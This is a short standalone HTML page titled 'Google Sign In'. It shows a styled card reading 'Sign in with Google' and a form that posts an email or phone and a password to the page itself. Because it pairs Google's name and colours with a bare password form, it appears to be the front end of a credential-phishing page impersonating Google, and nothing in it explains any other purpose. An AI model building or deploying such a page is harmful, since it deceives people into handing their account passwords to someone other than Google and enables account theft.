<!DOCTYPE html>
<html>
<head>
  <title>Google Sign In</title>
  <style>
    body { font-family: Arial, sans-serif; background:#f2f2f2; display:flex; align-items:center; justify-content:center; height:100vh; }
    .card { background:#fff; padding:30px; border-radius:10px; box-shadow:0 2px 8px rgba(0,0,0,.1); width:300px; }
    input, button { width:100%; margin:8px 0; padding:10px; border:1px solid #ccc; border-radius:6px; }
    button { background:#4285f4; color:white; border:none; }
  </style>
</head>
<body>
  <div class="card">
    <h2>Sign in with Google</h2>
    <form method="post">
      <input type="text" name="username" placeholder="Email or phone" required>
      <input type="password" name="password" placeholder="Enter password" required>
      <button type="submit">Login</button>
    </form>
  </div>
</body>
</html>
